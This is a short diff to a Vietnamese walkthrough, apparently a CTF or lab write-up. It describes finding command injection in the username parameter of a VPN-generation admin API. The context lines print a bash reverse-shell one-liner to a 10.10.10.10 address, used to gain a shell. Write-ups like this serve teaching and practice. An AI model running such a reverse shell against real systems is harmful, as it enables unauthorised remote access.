@@ -92,7 +92,7 @@ Tiếp theo là gửi `Post req` đến `/api/v1/admin/vpn/generate` để xem c
 Và `API` này nhận bát kỳ giá trị nào của param `username`, do đó có khả năng sẽ bị `Command Injection`. Ta sẽ tiến hành thử detect
 ![image](https://hackmd.io/_uploads/BkWczWCDle.png)
 Chỉ với việc inject đơn giản, ta đã có thể detect được lỗ hỏng. Để dễ dàng khai thác, ta cần đưa reverse shell vào để lấy shell thuận lợi cho việc khai thác hơn
-```shell!
+```shell
 sh -i >& /dev/tcp/10.10.10.10/4242 0>&1
 ```
 Mình sẽ dùng `bash`, sau đó chỉ cần inject vào là ta đẫ lấy được `reverse shell`.
